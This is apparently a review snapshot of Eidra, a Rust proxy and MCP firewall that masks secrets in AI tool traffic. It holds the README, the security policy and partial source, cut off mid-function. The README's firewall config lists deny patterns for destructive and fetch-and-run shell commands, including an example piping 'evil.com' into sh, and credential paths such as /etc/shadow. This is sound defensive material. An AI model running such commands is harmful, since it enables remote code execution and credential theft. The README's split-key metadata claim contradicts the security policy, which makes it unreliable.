# Eidra — Full Project Review Document (v3 — All Security Fixes + Semantic RBAC)

> Edge-native trust for humans, agents, and machines.

## Purpose
Complete snapshot for external review before open-source release.

## Project Summary
- **What**: Rust CLI — intercepts AI tool traffic, scans for secrets/PII, masks/blocks, MCP Semantic RBAC firewall, real-time TUI dashboard, E2EE channels
- **Stack**: Rust 2021, 11 crates + 1 SDK, MIT license

## What works (E2E verified):
- `eidra scan` — 47 regex rules, scans files/stdin
- `eidra start` — HTTP proxy on :8080, intercepts AI provider requests, blocks/masks
- `eidra dashboard` — ratatui TUI with live request stream
- `eidra escape/join` — TCP E2EE (X25519 + XChaCha20-Poly1305) with SAS authentication
- `eidra init` — CA cert generation, config setup, Ollama detection
- `eidra stop/config` — PID-based stop, config show/edit/reset
- MCP Semantic RBAC — blocks destructive SQL, sensitive file access, dangerous shell commands

## All security fixes applied:
1. ✅ MITM hyper native化 — manual HTTP parsing replaced with hyper server/client (no smuggling risk)
2. ✅ Chunked encoding — hyper handles natively now
3. ✅ UTF-8 boundary panic — safe String construction with is_char_boundary()
4. ✅ JSON-aware masking — serde_json tree-walk, falls back to plain text
5. ✅ CA cert trust chain — stores original DER, not rebuilt cert
6. ✅ Header parsing — httparse (removed after hyper native)
7. ✅ KeyPair zeroize — x25519-dalek zeroize feature enabled
8. ✅ Native cert validation — empty root store check
9. ✅ DH key exchange — SAS (Short Authentication String) for verbal verification
10. ✅ Nonce collision — XChaCha20-Poly1305 (192-bit nonce)
11. ✅ マイナンバー false positive — context-required pattern

## Known limitations (in SECURITY.md):
- HTTPS MITM: HTTP/1.1 only
- SAS is verbal verification, not cryptographic binding (v0.2: SPAKE2+)
- Sealed metadata: single local key, no Shamir split-key yet
- Device identity: software keys, no hardware secure element

## Stats
```
Rust files: 59
Total lines: 6922
Tests: 161
Clippy: 0 warnings
```

### Lines per crate
```
  eidra-audit: 304
  eidra-core: 760
  eidra-identity: 286
  eidra-mcp: 1249
  eidra-policy: 356
  eidra-proxy: 1013
  eidra-router: 547
  eidra-scan: 1404
  eidra-seal: 243
  eidra-transport: 321
  eidra-tui: 416
```

---
## Workspace Cargo.toml
```toml
[workspace]
resolver = "2"
members = [
    "crates/eidra-core",
    "crates/eidra-proxy",
    "crates/eidra-scan",
    "crates/eidra-policy",
    "crates/eidra-router",
    "crates/eidra-mcp",
    "crates/eidra-transport",
    "crates/eidra-identity",
    "crates/eidra-seal",
    "crates/eidra-audit",
    "crates/eidra-tui",
    "sdks/eidra-rs",
]

[workspace.package]
version = "0.1.0"
edition = "2021"
license = "MIT"
repository = "https://github.com/hanabi-jpn/eidra"
description = "Edge-native trust for humans, agents, and machines."

[workspace.dependencies]
tokio = { version = "1", features = ["full"] }
hyper = { version = "1", features = ["full"] }
hyper-util = { version = "0.1", features = ["tokio", "client-legacy", "http1"] }
http-body-util = "0.1"
rustls = "0.23"
rcgen = "0.13"
tokio-rustls = "0.26"
clap = { version = "4", features = ["derive"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
serde_yaml = "0.9"
regex = "1"
uuid = { version = "1", features = ["v4", "serde"] }
chrono = { version = "0.4", features = ["serde"] }
tracing = "0.1"
tracing-subscriber = { version = "0.3", features = ["env-filter"] }
ratatui = "0.29"
crossterm = "0.28"
rusqlite = { version = "0.32", features = ["bundled"] }
sha2 = "0.10"
zeroize = { version = "1", features = ["derive"] }
x25519-dalek = { version = "2", features = ["static_secrets", "zeroize"] }
chacha20poly1305 = "0.10"
aes-gcm = "0.10"
rand = "0.8"
webrtc = "0.12"
thiserror = "2"
anyhow = "1"
```

## README.md
```markdown
<p align="center">
  <h1 align="center">Eidra</h1>
  <p align="center"><strong>See exactly what your AI tools are leaking. Then stop it.</strong></p>
  <p align="center">
    <a href="https://github.com/hanabi-jpn/eidra/actions"><img src="https://github.com/hanabi-jpn/eidra/workflows/CI/badge.svg" alt="CI"></a>
    <a href="https://github.com/hanabi-jpn/eidra/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
    <a href="https://github.com/hanabi-jpn/eidra/stargazers"><img src="https://img.shields.io/github/stars/hanabi-jpn/eidra?style=social" alt="GitHub Stars"></a>
  </p>
</p>

---

Claude Code reads your `.env` without asking. Copilot repos leak secrets [40% more often](https://www.knostic.ai/blog/claude-cursor-env-file-secret-leakage). MCP tools have [CVSS 8.6 bypass vulnerabilities](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html). Your AI is sending your API keys, customer PII, and internal code to servers you don't control — and you can't even see it happening.

**Eidra is a local proxy that sits between you and your AI tools.** It scans every request, masks secrets before they leave your machine, blocks what shouldn't go, and shows you exactly what's flowing — in a beautiful real-time dashboard.

No cloud. No account. Everything on your device.

<p align="center">
  <img src="docs/demo.gif" alt="Eidra TUI Dashboard" width="800">
</p>

```bash
curl -sf eidra.dev/install | sh
eidra init
eidra dashboard
```

---

## The Problem

Every time you use Cursor, Claude Code, Copilot, or any AI coding tool:

1. Your **entire file context** — including `.env` files, API keys, database credentials — gets sent to cloud APIs
2. Your **MCP tools** can access files, databases, and services with no access control
3. You have **zero visibility** into what's actually being transmitted

You trust these tools with your most sensitive code. But you can't see what they're sending.

## The Fix

Eidra intercepts AI traffic at the proxy level and gives you full control:

| What happens | Without Eidra | With Eidra |
|---|---|---|
| AWS key in prompt | Sent to cloud | `[REDACTED:api_key:a3f2]` |
| `.env` contents | Sent silently | Blocked or masked |
| SSH private key | Sent to cloud | **Blocked** (403) |
| PII (email, SSN) | Sent to cloud | Masked for cloud, allowed for local LLM |
| MCP tool access | Unrestricted | Policy-controlled |

---

## Features

### Data Flow Visibility
- **47 built-in scan rules** — AWS keys, GitHub tokens, JWTs, private keys, PII, credit cards, Japanese phone numbers, and more
- **Real-time TUI dashboard** — see every request, finding, and action as it happens
- **SQLite audit log** — query what was sent, when, and what was done about it

### Intelligent Protection
- **Policy engine** — YAML rules that mask, block, or route based on severity, category, and destination
- **Smart masking** — replaces secrets with `[REDACTED:category:hash]` without breaking JSON structure
- **Local LLM routing** — automatically routes sensitive requests to Ollama instead of cloud
- **HTTPS interception** — transparent MITM proxy for AI provider domains (with local CA)

### MCP Firewall
- **Server whitelist** — only approved MCP servers can connect
- **Tool-level ACL** — allow `search_repositories` but block `create_issue`
- **Response scanning** — catch sensitive data coming back from tools
- **Rate limiting** — per-server request throttling

### Zero-Trace Communication
- **Encrypted rooms** — `eidra escape` creates E2EE channels (X25519 + ChaCha20-Poly1305)
- **No server storage** — session keys zeroized on disconnect
- **Device-bound identity** — agents authenticate via device keys

---

## Quick Start

```bash
# Install
curl -sf eidra.dev/install | sh
# Or build from source
git clone https://github.com/hanabi-jpn/eidra.git && cd eidra && cargo install --path crates/eidra-core

# Initialize (generates local CA, default config)
eidra init

# Start with dashboard
eidra dashboard

# Or just scan a file
echo "my key AKIAIOSFODNN7EXAMPLE" | eidra scan
```

### Trust the CA (for HTTPS interception)

```bash
# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.eidra/ca.pem

# Linux
sudo cp ~/.eidra/ca.pem /usr/local/share/ca-certificates/eidra.crt && sudo update-ca-certificates

# Then set your proxy
export HTTPS_PROXY=http://127.0.0.1:8080
```

---

## All Commands

```
eidra init              Generate CA certificate, create config
eidra start             Start the intercept proxy
eidra start -d          Start proxy + TUI dashboard
eidra dashboard         Start proxy + TUI dashboard
eidra stop              Stop the proxy
eidra scan [file]       Scan a file or stdin for secrets
eidra escape            Create a zero-trace encrypted room
eidra join <id> <port>  Join an encrypted room
eidra config            Show/edit configuration
```

---

## Policy Example

```yaml
# ~/.eidra/policy.yaml
version: "1"
default_action: allow
rules:
  - name: block_private_keys
    match:
      category: "private_key"
    action: block

  - name: mask_api_keys
    match:
      category: "api_key"
    action: mask

  - name: mask_pii_for_cloud
    match:
      category: "pii"
      destination: "cloud"
    action: mask

  - name: allow_pii_for_local
    match:
      category: "pii"
      destination: "local"
    action: allow
```

---

## MCP Firewall — Semantic RBAC

Traditional firewalls block by IP. Eidra blocks by **what the AI is trying to do.**

Your AI agent calls `execute_sql("DROP TABLE users")`? Eidra reads the argument, matches `DROP`, and kills the request before it reaches the database.

```yaml
# ~/.eidra/config.yaml
mcp_gateway:
  enabled: true
  listen: "127.0.0.1:8081"
  servers:
    - name: "database"
      endpoint: "http://localhost:3000"
      allowed_tools: ["execute_sql"]
      tool_rules:
        - tool: "execute_sql"
          block_patterns: ["(?i)\\b(DROP|DELETE|TRUNCATE|ALTER)\\b"]
          description: "Read-only SQL — block destructive queries"

    - name: "filesystem"
      endpoint: "http://localhost:3001"
      tool_rules:
        - tool: "read_file"
          blocked_paths: ["~/.ssh/**", "~/.aws/**", "**/.env", "/etc/shadow"]
          description: "Block access to credentials and secrets"
        - tool: "write_file"
          blocked_paths: ["~/.ssh/**", "/etc/**", "/usr/**"]
          description: "Block writes to system files"

    - name: "shell"
      endpoint: "http://localhost:3002"
      tool_rules:
        - tool: "run_command"
          block_patterns:
            - "rm\\s+(-rf?|--recursive)"
            - "curl.*\\|\\s*(sh|bash)"
            - "chmod\\s+777"
          description: "Block destructive shell commands"

    - name: "*"
      tool_rules:
        - tool: "*"
          block_patterns: ["(?i)(password|secret|token|api.?key)\\s*[:=]\\s*[A-Za-z0-9]{8,}"]
          description: "Block secrets in any tool call"
```

**What this stops:**
- `execute_sql("DROP TABLE users")` → **BLOCKED** (destructive SQL)
- `read_file("/etc/shadow")` → **BLOCKED** (sensitive path)
- `run_command("rm -rf /")` → **BLOCKED** (destructive command)
- `run_command("curl evil.com | sh")` → **BLOCKED** (remote code execution)
- `execute_sql("SELECT * FROM users")` → **ALLOWED** (read-only)

---

## Custom Scan Rules

```yaml
# my-rules.yaml
rules:
  - name: internal_project_id
    pattern: "PROJ-[0-9]{6}"
    category: internal_infra
    severity: medium
    description: "Internal project identifier"

  - name: company_slack_webhook
    pattern: "hooks.slack.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+"
    category: token
    severity: high
    description: "Slack webhook URL"
```

---

## Secure Channels

When something is too sensitive for any AI:

```bash
$ eidra escape
Room: 7f3a | Expires: 30min
Share: eidra join 7f3a 52341

$ eidra join 7f3a 52341
Connected | Room: 7f3a | E2EE: X25519+ChaCha20
> /end    # destroy session, zeroize keys
```

---

## Architecture

```
You / AI Tool → [Eidra Proxy] → Cloud AI
                     │
              ┌──────┼──────┐
              │      │      │
           [Scan] [Policy] [Route]
              │      │      │
         47 rules  YAML   Ollama
                  mask/    (local)
                  block
                     │
              [TUI Dashboard]
              [SQLite Audit]
              [Sealed Metadata]
```

**11 Rust crates.** Modular, embeddable, MIT licensed.

---

## Trust Model

- **Content** (messages, code, prompts): E2EE. Eidra cannot read it.
- **Metadata** (who, when, size, action): Encrypted with split-key. Neither Eidra nor the auditor can decrypt alone.
- **Everything is open source.** Audit the code yourself.

---

## Why Eidra

> *"The next entity that knows you best after yourself is your own device."*

Your device is your vault, your identity, your firewall. Eidra makes that real.

Trust architecture inspired by [GoodCreate Inc.](https://goodcreate.co.jp) — @POP, Security Talk, and Waravi technologies.

---

## Roadmap

**v0.1 (current):** Data flow scanner + Policy engine + MCP Semantic RBAC + TUI dashboard + E2EE channels

**v0.2:**
- Local SLM intent scanning — a small on-device language model that answers "is this action malicious?" before it happens. AI defending against AI.
- HTTP/2 MITM support
- IDE extensions (VS Code, JetBrains)

**v0.3:**
- Agent trust mesh — device-bound identity for AI agents, mutual authentication
- Sealed metadata with Shamir's Secret Sharing (split-key)
- SDK for agent frameworks (CrewAI, LangGraph, AutoGen, OpenClaw)

---

## Contributing

MIT Licensed. PRs welcome. See [CONTRIBUTING.md](docs/contributing.md).

```bash
git clone https://github.com/hanabi-jpn/eidra.git
cd eidra
cargo build
cargo test
```

---

<p align="center">
  <strong>Your AI is leaking. Now you can see it.</strong>
</p>
```

## SECURITY.md
```markdown
# Security Policy

## Reporting a Vulnerability

If you discover a security vulnerability in Eidra, **please do not open a public issue.**

Instead, please report it privately:

- Email: security@eidra.dev
- Include: description, reproduction steps, and impact assessment
- We will acknowledge within 48 hours and provide a fix timeline within 7 days

## Scope

Eidra is a security tool. We take vulnerabilities in Eidra itself extremely seriously:

- **Critical**: Bypass of scan rules, policy engine, or masking that allows secrets to leak
- **High**: TLS/crypto implementation flaws, key material exposure
- **Medium**: Denial of service, resource exhaustion, information disclosure
- **Low**: Configuration issues, documentation errors

## Security Design

### What Eidra does
- Scans AI tool traffic for secrets and PII using regex rules (no ML, no cloud)
- Applies policy-based masking/blocking before data leaves your device
- All processing is local — Eidra never sends your data anywhere

### What Eidra does NOT do
- Eidra does not store your secrets (findings contain category and hash, not the actual secret)
- Eidra does not phone home or collect telemetry
- Eidra does not modify non-AI traffic (only AI provider domains are intercepted)

### HTTPS Interception
- Eidra performs TLS MITM **only** for known AI provider domains (api.openai.com, api.anthropic.com, etc.)
- Non-AI HTTPS connections are tunneled transparently without interception
- The local CA certificate is generated during `eidra init` and must be explicitly trusted by the user
- CA private key is stored with 0600 permissions at `~/.eidra/ca-key.pem`

### Cryptography
- E2EE channels: X25519 key exchange + ChaCha20-Poly1305 (AEAD)
- Sealed metadata: AES-256-GCM
- Key zeroization: Secret keys are zeroized on drop via the `zeroize` crate
- Session keys are ephemeral and never persisted to disk

### Known Limitations (v0.1)
- HTTPS MITM does not support HTTP/2 (HTTP/1.1 only)
- Chunked transfer encoding in MITM mode is not fully supported
- Split-key sealed metadata (Shamir's Secret Sharing) is not yet implemented
- Device identity uses software key pairs, not hardware secure elements

## Supported Versions

| Version | Supported |
|---------|-----------|
| 0.1.x   | Yes       |

## Dependencies

Eidra uses well-audited cryptography crates:
- `x25519-dalek` (RustCrypto)
- `chacha20poly1305` (RustCrypto)
- `aes-gcm` (RustCrypto)
- `rustls` (no OpenSSL)
- `rcgen` (certificate generation)
```

---
## Full Source Code

### crates/eidra-audit/src/error.rs
```rust
use thiserror::Error;

#[derive(Debug, Error)]
pub enum AuditError {
    #[error("database error: {0}")]
    Database(#[from] rusqlite::Error),

    #[error("serialization error: {0}")]
    Serialization(#[from] serde_json::Error),

    #[error("io error: {0}")]
    Io(#[from] std::io::Error),

    #[error("lock error: {0}")]
    Lock(String),
}
```

### crates/eidra-audit/src/event.rs
```rust
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use uuid::Uuid;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum EventType {
    AiRequest,
    ScanFinding,
    PolicyAction,
    AgentMessage,
    IdentityVerification,
    Custom(String),
}

impl std::fmt::Display for EventType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::AiRequest => write!(f, "ai_request"),
            Self::ScanFinding => write!(f, "scan_finding"),
            Self::PolicyAction => write!(f, "policy_action"),
            Self::AgentMessage => write!(f, "agent_message"),
            Self::IdentityVerification => write!(f, "identity_verification"),
            Self::Custom(s) => write!(f, "{}", s),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ActionTaken {
    Allow,
    Mask,
    Block,
    Escalate,
    Custom(String),
}

impl std::fmt::Display for ActionTaken {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Allow => write!(f, "allow"),
            Self::Mask => write!(f, "mask"),
            Self::Block => write!(f, "block"),
            Self::Escalate => write!(f, "escalate"),
            Self::Custom(s) => write!(f, "{}", s),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditEvent {
    pub id: Uuid,
    pub timestamp: DateTime<Utc>,
    pub event_type: EventType,
    pub action: ActionTaken,
    pub destination: String,
    pub findings_count: u32,
    pub findings_summary: String,
    pub data_size_bytes: u64,
    pub metadata: HashMap<String, String>,
}

impl AuditEvent {
    pub fn new(
        event_type: EventType,
        action: ActionTaken,
        destination: impl Into<String>,
        findings_count: u32,
        findings_summary: impl Into<String>,
        data_size_bytes: u64,
    ) -> Self {
        Self {
            id: Uuid::new_v4(),
            timestamp: Utc::now(),
            event_type,
            action,
            destination: destination.into(),
            findings_count,
            findings_summary: findings_summary.into(),
            data_size_bytes,
            metadata: HashMap::new(),
        }
    }
}
```

### crates/eidra-audit/src/lib.rs
```rust
pub mod error;
pub mod event;
pub mod store;
```

### crates/eidra-audit/src/store.rs
```rust
use crate::error::AuditError;
use crate::event::AuditEvent;
use rusqlite::Connection;
use std::path::Path;
use std::sync::Mutex;

pub struct AuditStore {
    conn: Mutex<Connection>,
}

impl AuditStore {
    pub fn open(path: &Path) -> Result<Self, AuditError> {
        let conn = Connection::open(path)?;
        let store = Self {
            conn: Mutex::new(conn),
        };
        store.init_tables()?;
        Ok(store)
    }

    pub fn open_in_memory() -> Result<Self, AuditError> {
        let conn = Connection::open_in_memory()?;
        let store = Self {
            conn: Mutex::new(conn),
        };
        store.init_tables()?;
        Ok(store)
    }

    fn init_tables(&self) -> Result<(), AuditError> {
        let conn = self
            .conn
            .lock()
            .map_err(|e| AuditError::Lock(e.to_string()))?;
        conn.execute_batch(
            "CREATE TABLE IF NOT EXISTS audit_events (
                id TEXT PRIMARY KEY,
                timestamp TEXT NOT NULL,
                event_type TEXT NOT NULL,
                action TEXT NOT NULL,
                destination TEXT NOT NULL,
                findings_count INTEGER NOT NULL DEFAULT 0,
                findings_summary TEXT,
                data_size_bytes INTEGER NOT NULL DEFAULT 0,
                metadata TEXT
            );",
        )?;
        Ok(())
    }

    pub fn log_event(&self, event: &AuditEvent) -> Result<(), AuditError> {
        let metadata_json = serde_json::to_string(&event.metadata)?;
        let conn = self
            .conn
            .lock()
            .map_err(|e| AuditError::Lock(e.to_string()))?;
        conn.execute(
            "INSERT INTO audit_events (id, timestamp, event_type, action, destination, findings_count, findings_summary, data_size_bytes, metadata)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9)",
            rusqlite::params![
                event.id.to_string(),
                event.timestamp.to_rfc3339(),
                event.event_type.to_string(),
                event.action.to_string(),
                event.destination,
                event.findings_count,
                event.findings_summary,
                event.data_size_bytes,
                metadata_json,
            ],
        )?;
        Ok(())
    }

    pub fn query_recent(&self, limit: usize) -> Result<Vec<AuditEvent>, AuditError> {
        let conn = self
            .conn
            .lock()
            .map_err(|e| AuditError::Lock(e.to_string()))?;
        let mut stmt = conn.prepare(
            "SELECT id, timestamp, event_type, action, destination, findings_count, findings_summary, data_size_bytes, metadata
             FROM audit_events ORDER BY timestamp DESC LIMIT ?1"
        )?;
        let rows = stmt.query_map(rusqlite::params![limit], |row| {
            let id_str: String = row.get(0)?;
            let ts_str: String = row.get(1)?;
            let event_type_str: String = row.get(2)?;
            let action_str: String = row.get(3)?;
            let destination: String = row.get(4)?;
            let findings_count: u32 = row.get(5)?;
            let findings_summary: String = row.get(6)?;
            let data_size_bytes: u64 = row.get(7)?;
            let metadata_str: String = row.get(8)?;

            Ok((
                id_str,
                ts_str,
                event_type_str,
                action_str,
                destination,
                findings_count,
                findings_summary,
                data_size_bytes,
                metadata_str,
            ))
        })?;

        let mut events = Vec::new();
        for row in rows {
            let (
                id_str,
                ts_str,
                event_type_str,
                action_str,
                destination,
                findings_count,
                findings_summary,
                data_size_bytes,
                metadata_str,
            ) = row?;

            let id = uuid::Uuid::parse_str(&id_str).unwrap_or_else(|_| uuid::Uuid::new_v4());
            let timestamp = chrono::DateTime::parse_from_rfc3339(&ts_str)
                .map(|dt| dt.with_timezone(&chrono::Utc))
                .unwrap_or_else(|_| chrono::Utc::now());
            let event_type = match event_type_str.as_str() {
                "ai_request" => crate::event::EventType::AiRequest,
                "scan_finding" => crate::event::EventType::ScanFinding,
                "policy_action" => crate::event::EventType::PolicyAction,
                "agent_message" => crate::event::EventType::AgentMessage,
                "identity_verification" => crate::event::EventType::IdentityVerification,
                other => crate::event::EventType::Custom(other.to_string()),
            };
            let action = match action_str.as_str() {
                "allow" => crate::event::ActionTaken::Allow,
                "mask" => crate::event::ActionTaken::Mask,
                "block" => crate::event::ActionTaken::Block,
                "escalate" => crate::event::ActionTaken::Escalate,
                other => crate::event::ActionTaken::Custom(other.to_string()),
            };
            let metadata: std::collections::HashMap<String, String> =
                serde_json::from_str(&metadata_str).unwrap_or_default();

            events.push(AuditEvent {
                id,
                timestamp,
                event_type,
                action,
                destination,
                findings_count,
                findings_summary,
                data_size_bytes,
                metadata,
            });
        }
        Ok(events)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::{ActionTaken, AuditEvent, EventType};

    #[test]
    fn test_log_and_query() {
        let store = AuditStore::open_in_memory().unwrap();
        let event = AuditEvent::new(
            EventType::AiRequest,
            ActionTaken::Allow,
            "api.openai.com",
            0,
            "[]",
            1024,
        );
        store.log_event(&event).unwrap();

        let results = store.query_recent(10).unwrap();
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].destination, "api.openai.com");
        assert_eq!(results[0].findings_count, 0);
    }

    #[test]
    fn test_log_with_findings() {
        let store = AuditStore::open_in_memory().unwrap();
        let event = AuditEvent::new(
            EventType::ScanFinding,
            ActionTaken::Mask,
            "api.anthropic.com",
            2,
            r#"["api_key","pii"]"#,
            2048,
        );
        store.log_event(&event).unwrap();

        let results = store.query_recent(10).unwrap();
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].findings_count, 2);
    }
}
```

### crates/eidra-core/src/commands/config.rs
```rust
use std::path::PathBuf;

pub async fn run(action: Option<String>) -> anyhow::Result<()> {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
    let eidra_dir = PathBuf::from(&home).join(".eidra");
    let config_path = eidra_dir.join("config.yaml");
    let policy_path = eidra_dir.join("policy.yaml");

    match action.as_deref() {
        Some("show") | None => {
            println!("Eidra Configuration");
            println!("===================");
            println!();
            println!("Config dir:  {}", eidra_dir.display());
            println!("Config file: {}", config_path.display());
            println!("Policy file: {}", policy_path.display());
            println!("Audit DB:    {}", eidra_dir.join("audit.db").display());
            println!("CA cert:     {}", eidra_dir.join("ca.pem").display());
            println!("CA key:      {}", eidra_dir.join("ca-key.pem").display());
            println!();

            if config_path.exists() {
                println!("--- config.yaml ---");
                let content = std::fs::read_to_string(&config_path)?;
                println!("{}", content);
            } else {
                println!("Config file not found. Run `eidra init` first.");
            }

            if policy_path.exists() {
                println!("--- policy.yaml ---");
                let content = std::fs::read_to_string(&policy_path)?;
                println!("{}", content);
            }
        }
        Some("path") => {
            println!("{}", eidra_dir.display());
        }
        Some("edit") => {
            let editor = std::env::var("EDITOR").unwrap_or_else(|_| "vi".to_string());
            let status = std::process::Command::new(&editor)
                .arg(&config_path)
                .status()?;
            if !status.success() {
                anyhow::bail!("editor exited with non-zero status");
            }
        }
        Some("edit-policy") => {
            let editor = std::env::var("EDITOR").unwrap_or_else(|_| "vi".to_string());
            let status = std::process::Command::new(&editor)
                .arg(&policy_path)
                .status()?;
            if !status.success() {
                anyhow::bail!("editor exited with non-zero status");
            }
        }
        Some("reset") => {
            let default_config = include_str!("../../../../config/default.yaml");
            let default_policy = include_str!("../../../../config/policies/default.yaml");
            std::fs::write(&config_path, default_config)?;
            std::fs::write(&policy_path, default_policy)?;
            println!("Configuration reset to defaults.");
        }
        Some(other) => {
            println!("Unknown config action: {}", other);
            println!();
            println!("Usage:");
            println!("  eidra config              Show current configuration");
            println!("  eidra config show         Show current configuration");
            println!("  eidra config path         Print config directory path");
            println!("  eidra config edit         Open config.yaml in $EDITOR");
            println!("  eidra config edit-policy  Open policy.yaml in $EDITOR");
            println!("  eidra config reset        Reset to default configuration");
        }
    }

    Ok(())
}
```

### crates/eidra-core/src/commands/dashboard.rs
```rust
use std::io;
use std::time::Duration;

use crossterm::event::{self, Event, KeyCode, KeyEventKind};
use crossterm::execute;
use crossterm::terminal::{
    disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen,
};
use ratatui::backend::CrosstermBackend;
use ratatui::Terminal;

use eidra_proxy::EventReceiver;
use eidra_tui::app::TuiApp;
use eidra_tui::event::{RequestAction, RequestEntry};
use eidra_tui::ui;

pub async fn run_tui(mut event_rx: EventReceiver) -> anyhow::Result<()> {
    // Setup terminal
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let mut app = TuiApp::new();
    let start_time = std::time::Instant::now();

    loop {
        app.uptime_secs = start_time.elapsed().as_secs();
        // Draw
        terminal.draw(|frame| {
            ui::render(frame, &app);
        })?;

        // Poll for proxy events (non-blocking)
        while let Ok(proxy_event) = event_rx.try_recv() {
            let action = match proxy_event.action.as_str() {
                "block" => RequestAction::Block,
                "mask" => RequestAction::Mask,
                "allow" => RequestAction::Allow,
                _ => RequestAction::Allow,
            };
            app.add_entry(RequestEntry {
                timestamp: proxy_event.timestamp,
                action,
                provider: proxy_event.provider,
                findings_count: proxy_event.findings_count,
                categories: proxy_event.categories,
                data_size_bytes: proxy_event.data_size_bytes,
                latency_ms: 0,
            });
        }

        // Poll for keyboard events
        if event::poll(Duration::from_millis(100))? {
            if let Event::Key(key) = event::read()? {
                if key.kind == KeyEventKind::Press {
                    match key.code {
                        KeyCode::Char('q') | KeyCode::Esc => {
                            app.should_quit = true;
                            break;
                        }
                        KeyCode::Char('j') | KeyCode::Down => app.scroll_down(),
                        KeyCode::Char('k') | KeyCode::Up => app.scroll_up(),
                        _ => {}
                    }
                }
            }
        }
    }

    // Restore terminal
    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen)?;
    terminal.show_cursor()?;

    Ok(())
}
```

### crates/eidra-core/src/commands/escape.rs
```rust
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

use eidra_transport::crypto::{derive_shared_secret, encrypt, generate_keypair};
use eidra_transport::room::generate_room_id;

pub async fn run() -> anyhow::Result<()> {
    let listener = TcpListener::bind("127.0.0.1:0").await?;
    let addr = listener.local_addr()?;
    let room_id = generate_room_id();

    println!("Room: {} | Expires: 30min", room_id);
    println!("Share: eidra join {} {}", room_id, addr.port());
    println!("Waiting for peer...");
    println!();

    let (mut stream, peer_addr) = listener.accept().await?;
    println!("Connected from {} | E2EE: X25519+ChaCha20", peer_addr);

    // Key exchange: send our public key, receive theirs
    let keypair = generate_keypair();
    let our_public = keypair.public_key.as_bytes().to_owned();
    stream.write_all(&our_public).await?;

    let mut their_public_bytes = [0u8; 32];
    stream.read_exact(&mut their_public_bytes).await?;

    let their_public = x25519_dalek::PublicKey::from(their_public_bytes);
    let shared_secret = derive_shared_secret(keypair.secret_key(), &their_public);
    let key: [u8; 32] = *shared_secret.as_bytes();

    // Generate SAS (Short Authentication String) for verification
    let sas = generate_sas(&key);
    println!("E2EE established.");
    println!("\u{1f510} Verify with peer \u{2014} SAS: {}", sas);
    println!("  If this doesn't match your peer's SAS, type /end immediately.");
    println!();

    chat_loop_internal(stream, key).await
}

pub(crate) async fn chat_loop_external(
    stream: TcpStream,
    shared_secret: x25519_dalek::SharedSecret,
) -> anyhow::Result<()> {
    let key: [u8; 32] = *shared_secret.as_bytes();

    // Generate SAS (Short Authentication String) for verification
    let sas = generate_sas(&key);
    println!("E2EE established.");
    println!("\u{1f510} Verify with peer \u{2014} SAS: {}", sas);
    println!("  If this doesn't match your peer's SAS, type /end immediately.");
    println!();

    chat_loop_internal(stream, key).await
}

async fn chat_loop_internal(stream: TcpStream, key: [u8; 32]) -> anyhow::Result<()> {
    let (mut reader, mut writer) = stream.into_split();
    let key_recv = key;

    // Spawn receiver task
    let recv_handle = tokio::spawn(async move {
        loop {
            // Read 4-byte length prefix
            let mut len_buf = [0u8; 4];
            if reader.read_exact(&mut len_buf).await.is_err() {
                break;
            }
            let len = u32::from_be_bytes(len_buf) as usize;
            if len == 0 || len > 1_000_000 {
                break;
            }

            // Read encrypted message
            let mut enc_buf = vec![0u8; len];
            if reader.read_exact(&mut enc_buf).await.is_err() {
                break;
            }

            match eidra_transport::crypto::decrypt(&key_recv, &enc_buf) {
                Ok(plaintext) => {
                    let msg = String::from_utf8_lossy(&plaintext);
                    println!("\r\x1b[K\x1b[36mpeer>\x1b[0m {}", msg);
                    print!("> ");
                    let _ = std::io::Write::flush(&mut std::io::stdout());
                }
                Err(_) => {
                    println!("\r\x1b[K\x1b[31m[decryption failed]\x1b[0m");
                }
            }
        }
    });

    // Send loop: read from stdin
    let stdin = tokio::io::stdin();
    let mut stdin_reader = tokio::io::BufReader::new(stdin);
    let mut line_buf = String::new();

    loop {
        print!("> ");
        let _ = std::io::Write::flush(&mut std::io::stdout());

        line_buf.clear();
        let n = stdin_reader.read_line(&mut line_buf).await?;
        if n == 0 {
            break;
        }

        let msg = line_buf.trim();
        if msg == "/end" {
            println!("Session ended. Keys zeroized.");
            break;
        }
        if msg.is_empty() {
            continue;
        }

        let encrypted = encrypt(&key, msg.as_bytes()).map_err(|e| anyhow::anyhow!("{}", e))?;

        let len = (encrypted.len() as u32).to_be_bytes();
        writer.write_all(&len).await?;
        writer.write_all(&encrypted).await?;
        writer.flush().await?;
    }

    recv_handle.abort();
    Ok(())
}

/// Generate a Short Authentication String from the shared secret.
/// Returns a 4-word phrase from the NATO phonetic alphabet for verbal verification.
fn generate_sas(key: &[u8; 32]) -> String {
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    hasher.update(b"eidra-sas-v1");
    hasher.update(key);
    let hash = hasher.finalize();

    // Use first 4 bytes to select 4 words from a wordlist
    const WORDS: &[&str] = &[
        "alpha", "bravo", "charlie", "delta", "echo", "foxtrot", "golf", "hotel", "india",
